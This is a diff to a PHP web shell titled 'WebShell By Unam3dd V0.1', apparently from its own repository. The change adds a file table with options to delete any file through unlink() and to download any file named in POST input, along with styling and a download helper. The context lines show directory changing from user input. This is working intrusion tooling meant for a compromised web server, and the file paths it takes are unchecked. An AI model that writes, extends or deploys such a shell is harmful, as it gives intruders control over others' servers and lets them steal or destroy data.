@@ -1,3 +1,30 @@
+<?php
+function getUrl(){
+    $link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 
+                "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
+  
+return $link."/"; 
+}
+
+
+function downloadWithUri($uri, $filename){
+
+// Use file_get_contents() function to get the file 
+// from url and use file_put_contents() function to 
+// save the file by using base name 
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="'.$filename.'"');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($filename));
+            flush(); // Flush system output buffer
+            readfile($filename);
+            die();
+}
+
+?>
 <html>
     <head>
         <meta charset="UTF-8">
@@ -6,6 +33,37 @@
         <title>WebShell By Unam3dd V0.1</title>
         <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/Unam3dd/MyFirstWebShell/master/MOSHED-2019-12-24-11-19-59.gif">
         <link href="https://fonts.googleapis.com/css?family=Cinzel&display=swap" rel="stylesheet">
+        <style type="text/css">
+            .select_option{
+                color:green;
+                background:black;
+            }
+            #customers {
+  font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+  border-collapse: collapse;
+  width: 50%;
+}
+
+#customers td, #customers th {
+  border: 1px solid #ddd;
+  padding: 8px;
+}
+
+#customers tr
+{
+    background-color: #black;
+    color:green;
+}
+
+
+#customers th {
+  padding-top: 12px;
+  padding-bottom: 12px;
+  text-align: left;
+  background-color: #green;
+  color: green;
+}
+        </style>
     </head>
 
     <body style="background-color: black;width:100%;margin:auto;min-width:600px;max-width:2000px;">
@@ -238,7 +296,7 @@
             $new_dir = $_POST["cddir"];
             if (file_exists($new_dir)) {
                 chdir($new_dir);
-                echo '<p style="border:1px solid green;width: 20%;margin: auto;color: green;position: absolute;top: 650px;left: 10px;color: green;">[+] Dir Changed => '.$new_dir.'</p>';
+                echo '<p style="border:1px solid green;width: 20%;margin: auto;color: green;position: absolute;top: 650px;left: 10px;color: green;">[+] Dir Changed => '.$new_dir.'</p>';
             } else {
                 echo '<p style="border:1px solid red;width: 20%;margin: auto;color: red;position: absolute;top: 650px;left: 10px;color: red;">[-] '.$new_dir.' Not Found !</p>';
             }
@@ -265,15 +323,54 @@
         $files = scandir($dir);
         $max_repo = sizeof($files);
         $i = 1;
-        echo '<center><font face="Cinzel" color="green" size="1"><h1 style="border:1px solid green;width: 50%;margin: auto;color: green;">Path '.$dir.'</h1></font></center>';
-        for ($y = 0;$i <= $max_repo; $i++){
-            echo '<pre style="border:1px solid green;width: 50%;margin: auto;color: green;">'.$files[$i].'<a style="position: absolute;right: 500px;color: yellow;" href="'.$files[$i].'">Download</a></pre>';
-        }
         
-        for ($o = 0;$o<20;$o++){
-            echo '<br></br>';
-        }
         ?>
+        <center>
+        <table id="customers">
+  <tr>
+    <th>Name</th>
+    <th>Size</th>
+    <th>Action</th>
+  </tr>
+  <?php
+  for ($i=0; $i < sizeof($files); $i++) {  ?>
+      <tr>
+        <td><?php echo $files[$i]; ?></td>
+        <td><?php echo filesize($files[$i]); ?></td>
+        <td><form method="POST"><select class="select_option" name="action">
+             <option class="select_option" value="act" selected="">Action..</option> 
+  <option value="delete">Delete</option> 
+
+  <option value="download"> Download</option>
+
+
+</select> 
+<input value="<?php echo $files[$i]; ?>" name="fildir" hidden="">
+<button class="select_option" name="send_action">>></button></form></td>
+      </tr>
+
+
+      
+  <?php }
+
+
+  ?>
+
+  <?php
+      if(isset($_POST["send_action"])){
+        if($_POST["action"] == "delete"){
+            unlink($_POST["fildir"]);
+        } else if($_POST["action"] == "download"){
+            downloadWithUri(getUrl(), $_POST["fildir"]);
+        }
+      }
+
+
+      ?>
+  
+  
+</table>
+</center>
         <br></br>
         <br></br>
         <br></br>
